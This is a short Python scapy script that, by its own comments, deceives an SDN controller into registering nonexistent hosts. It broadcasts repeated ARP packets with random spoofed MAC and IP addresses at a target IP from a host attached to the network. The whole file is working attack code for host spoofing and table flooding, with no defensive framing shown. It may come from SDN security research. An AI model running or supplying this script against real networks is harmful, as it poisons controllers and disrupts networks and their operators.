#! /usr/bin/env python
# Script to send packets with different mac addresses  to the SDN network 
# It deceives the controller to "add" a new inexisting host in the network.
# It must run on a host connected to a switch in the SDN network 
# Args 1. DstMAC 2. DstIP
import scapy.all as scapy
from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP
from scapy.layers.inet import ICMP
from scapy.layers.l2 import ARP
import sys

def pingen(qp,ifa,hServerMAC,hServerIP):
    for i in range(qp):
        r=RandMAC()._fix()
        i=RandIP()._fix()
        packet =Ether(dst='ff:ff:ff:ff:ff:ff',src=r,type=0x0806)/ARP(
            hwsrc=r ,psrc= i,pdst=hServerIP)
        sendp(packet, count=100,iface=ifa)
hServerMAC=sys.argv[1]
hServerIP=sys.argv[2]
ifs=os.listdir('/sys/class/net/')
print(ifs)
print(hServerMAC)
print(hServerIP)
payload = 'PAYLOAD_OF_THE_PACKET_12345467890'
pingen(10,ifs[1],hServerMAC, hServerIP)

